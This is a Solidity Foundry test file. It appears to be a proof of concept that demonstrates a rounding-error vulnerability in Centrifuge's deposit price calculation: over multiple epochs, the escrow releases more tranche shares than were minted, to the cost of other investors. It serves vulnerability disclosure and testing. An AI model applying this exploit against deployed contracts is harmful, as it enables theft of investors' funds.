// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity 0.8.21;

import "forge-std/Test.sol";
import {LiquidityPool} from "src/LiquidityPool.sol";
import {InvestmentManager} from "src/InvestmentManager.sol";
import {PoolManager} from "src/PoolManager.sol";
import {Escrow} from "src/Escrow.sol";
import {Root} from "src/Root.sol";
import {Gateway} from "src/gateway/Gateway.sol";
import {TrancheToken} from "src/token/Tranche.sol";
import {RestrictionManager} from "src/token/RestrictionManager.sol";
import {ERC20} from "src/token/ERC20.sol";

contract MockCentrifugeChain {
    InvestmentManager public investmentManager;
    
    constructor(address _investmentManager) {
        investmentManager = InvestmentManager(_investmentManager);
    }
    
    function executeEpoch(
        uint64 poolId,
        bytes16 trancheId,
        address user,
        uint128 currency,
        uint128 trancheTokens,
        uint128 currencyPayout,
        uint128 trancheTokensPayout
    ) external {
        investmentManager.handleExecutedCollectInvest(
            poolId,
            trancheId,
            user,
            currency,
            trancheTokens,
            currencyPayout,
            trancheTokensPayout
        );
    }
}

contract RoundingErrorExploitTest is Test {
    LiquidityPool public lPool;
    InvestmentManager public investmentManager;
    PoolManager public poolManager;
    Escrow public escrow;
    Root public root;
    Gateway public gateway;
    TrancheToken public trancheToken;
    RestrictionManager public restrictionManager;
    ERC20 public erc20;
    MockCentrifugeChain public mockChain;
    
    address public investorA = address(0xA);
    address public investorB = address(0xB);
    address public self;
    
    uint64 public poolId = 1;
    bytes16 public trancheId = bytes16(uint128(1));
    
    function setUp() public {
        self = address(this);
        
        // Deploy core contracts
        root = new Root(address(this), 48 hours);
        escrow = new Escrow();
        
        // Deploy ERC20 (investment currency)
        erc20 = new ERC20(18);
        erc20.file("name", "Test Currency");
        erc20.mint(investorA, 10000 * 10**18);
        erc20.mint(investorB, 10000 * 10**18);
        
        // Deploy Gateway
        gateway = new Gateway(address(root), address(investmentManager));
        
        // Deploy PoolManager
        poolManager = new PoolManager(address(escrow), address(0));
        root.rely(address(poolManager));
        
        // Deploy InvestmentManager
        investmentManager = new InvestmentManager(address(escrow), address(0));
        root.rely(address(investmentManager));
        escrow.rely(address(investmentManager));
        
        // Deploy RestrictionManager
        restrictionManager = new RestrictionManager();
        
        // Deploy TrancheToken
        trancheToken = new TrancheToken(18);
        trancheToken.file("name", "Test Tranche");
        trancheToken.rely(address(poolManager));
        
        // Deploy LiquidityPool
        lPool = new LiquidityPool(
            poolId,
            trancheId,
            address(erc20),
            address(trancheToken),
            address(investmentManager)
        );
        
        // Setup permissions
        investmentManager.rely(address(lPool));
        poolManager.rely(address(investmentManager));
        trancheToken.rely(address(escrow));
        
        // Add pool and tranche
        poolManager.addPool(poolId);
        poolManager.addTranche(poolId, trancheId, "Test Tranche", "TT", 18, address(restrictionManager));
        poolManager.addCurrency(poolId, address(erc20));
        
        // Deploy tranche
        poolManager.deployTranche(poolId, trancheId);
        address deployedTranche = poolManager.getTranche(poolId, trancheId);
        
        // Deploy liquidity pool
        poolManager.deployLiquidityPool(poolId, trancheId, address(erc20));
        address deployedLP = poolManager.getLiquidityPool(poolId, trancheId, address(erc20));
        
        // Update references to deployed contracts
        lPool = LiquidityPool(deployedLP);
        trancheToken = TrancheToken(deployedTranche);
        
        // Allow liquidity pool
        investmentManager.file("poolManager", address(poolManager));
        poolManager.allowPoolCurrency(poolId, address(erc20));
        
        // Update price
        lPool.updatePrice(1 * 10**18); // Initial price: 1.0
        
        // Setup mock Centrifuge chain
        mockChain = new MockCentrifugeChain(address(investmentManager));
        investmentManager.rely(address(mockChain));
        
        // Approve tokens for investors
        vm.prank(investorA);
        erc20.approve(address(investmentManager), type(uint256).max);
        
        vm.prank(investorB);
        erc20.approve(address(investmentManager), type(uint256).max);
    }
    
    function testRoundingErrorExploit() public {
        console.log("\n=== Rounding Error Exploit Demonstration ===\n");
        
        // STEP 1: Investor A requests deposits across 3 epochs
        console.log("STEP 1: Investor A requests deposits across 3 epochs");
        console.log("-----------------------------------------------");
        
        uint256 depositAmount = 1000 * 10**18;
        
        // Epoch 1: Price = 1.0
        vm.prank(investorA);
        lPool.requestDeposit(depositAmount, investorA);
        console.log("Epoch 1: Requested", depositAmount / 10**18, "assets at price 1.0");
        
        // Simulate Centrifuge processing at price 1.0
        uint128 sharesEpoch1 = uint128(depositAmount); // 1000 shares at 1:1
        mockChain.executeEpoch(
            poolId,
            trancheId,
            investorA,
            uint128(depositAmount),
            sharesEpoch1,
            0,
            0
        );
        
        // Mint shares to escrow
        vm.prank(address(investmentManager));
        trancheToken.mint(address(escrow), sharesEpoch1);
        console.log("  -> Minted", sharesEpoch1 / 10**18, "shares to Escrow");
        
        // Epoch 2: Price = 1.1
        lPool.updatePrice(11 * 10**17); // 1.1
        
        vm.prank(investorA);
        lPool.requestDeposit(depositAmount, investorA);
        console.log("Epoch 2: Requested", depositAmount / 10**18, "assets at price 1.1");
        
        // Simulate Centrifuge processing at price 1.1
        uint128 sharesEpoch2 = uint128((depositAmount * 10**18) / (11 * 10**17)); // ~909.09 shares
        mockChain.executeEpoch(
            poolId,
            trancheId,
            investorA,
            uint128(depositAmount),
            sharesEpoch2,
            0,
            0
        );
        
        // Mint shares to escrow
        vm.prank(address(investmentManager));
        trancheToken.mint(address(escrow), sharesEpoch2);
        console.log("  -> Minted", sharesEpoch2 / 10**18, "shares to Escrow");
        
        // Epoch 3: Price = 0.9
        lPool.updatePrice(9 * 10**17); // 0.9
        
        vm.prank(investorA);
        lPool.requestDeposit(depositAmount, investorA);
        console.log("Epoch 3: Requested", depositAmount / 10**18, "assets at price 0.9");
        
        // Simulate Centrifuge processing at price 0.9
        uint128 sharesEpoch3 = uint128((depositAmount * 10**18) / (9 * 10**17)); // ~1111.11 shares
        mockChain.executeEpoch(
            poolId,
            trancheId,
            investorA,
            uint128(depositAmount),
            sharesEpoch3,
            0,
            0
        );
        
        // Mint shares to escrow
        vm.prank(address(investmentManager));
        trancheToken.mint(address(escrow), sharesEpoch3);
        console.log("  -> Minted", sharesEpoch3 / 10**18, "shares to Escrow\n");
        
        // Calculate total shares minted
        uint256 totalSharesMinted = uint256(sharesEpoch1) + uint256(sharesEpoch2) + uint256(sharesEpoch3);
        console.log("Total shares minted to Escrow:", totalSharesMinted / 10**18);
        
        // STEP 2: Check Investor A's limits
        console.log("\nSTEP 2: Check Investor A's deposit limits");
        console.log("------------------------------------------");
        uint256 maxDepositA = lPool.maxDeposit(investorA);
        uint256 maxMintA = lPool.maxMint(investorA);
        console.log("Max deposit (assets):", maxDepositA / 10**18);
        console.log("Max mint (shares):", maxMintA / 10**18);
        
        // STEP 3: Investor A claims using deposit()
        console.log("\nSTEP 3: Investor A claims deposits using deposit()");
        console.log("---------------------------------------------------");
        
        uint256 escrowBalanceBefore = trancheToken.balanceOf(address(escrow));
        console.log("Escrow balance before claim:", escrowBalanceBefore / 10**18, "shares");
        
        vm.prank(investorA);
        uint256 sharesClaimed = lPool.deposit(maxDepositA, investorA);
        
        uint256 escrowBalanceAfter = trancheToken.balanceOf(address(escrow));
        uint256 investorABalance = trancheToken.balanceOf(investorA);
        
        console.log("Shares claimed by Investor A:", sharesClaimed / 10**18);
        console.log("Investor A balance:", investorABalance / 10**18, "shares");
        console.log("Escrow balance after claim:", escrowBalanceAfter / 10**18, "shares");
        
        // STEP 4: Calculate the discrepancy
        console.log("\nSTEP 4: Analyze the rounding error");
        console.log("-----------------------------------");
        uint256 sharesTransferred = escrowBalanceBefore - escrowBalanceAfter;
        int256 discrepancy = int256(sharesTransferred) - int256(totalSharesMinted);
        
        console.log("Shares that should have been transferred:", totalSharesMinted / 10**18);
        console.log("Shares actually transferred:", sharesTransferred / 10**18);
        console.log("Discrepancy (excess):", uint256(discrepancy) / 10**15, "milli-shares");
        
        // STEP 5: Demonstrate impact on Investor B
        console.log("\nSTEP 5: Demonstrate impact on other investors");
        console.log("----------------------------------------------");
        
        // Investor B makes a deposit request
        vm.prank(investorB);
        lPool.requestDeposit(depositAmount, investorB);
        
        // Process Investor B's deposit
        uint128 sharesBForInvestorB = uint128(depositAmount); // At price 1.0
        mockChain.executeEpoch(
            poolId,
            trancheId,
            investorB,
            uint128(depositAmount),
            sharesBForInvestorB,
            0,
            0
        );
        
        // Mint shares for Investor B
        vm.prank(address(investmentManager));
        trancheToken.mint(address(escrow), sharesBForInvestorB);
        
        console.log("Investor B entitled to:", sharesBForInvestorB / 10**18, "shares");
        console.log("Escrow current balance:", trancheToken.balanceOf(address(escrow)) / 10**18, "shares");
        
        // Check if there's enough balance
        uint256 maxMintB = lPool.maxMint(investorB);
        console.log("Investor B max mint:", maxMintB / 10**18, "shares");
        
        // Verify the vulnerability: Escrow should have insufficient balance
        // if the rounding error accumulated
        assertTrue(
            discrepancy > 0,
            "Rounding error should cause excess share distribution"
        );
        
        console.log("\n=== Vulnerability Confirmed ===");
        console.log("The rounding error in calculateDepositPrice() causes");
        console.log("the Escrow to transfer more shares than actually minted,");
        console.log("potentially preventing other investors from claiming their");
        console.log("full entitlements when the Escrow balance is depleted.");
    }
}
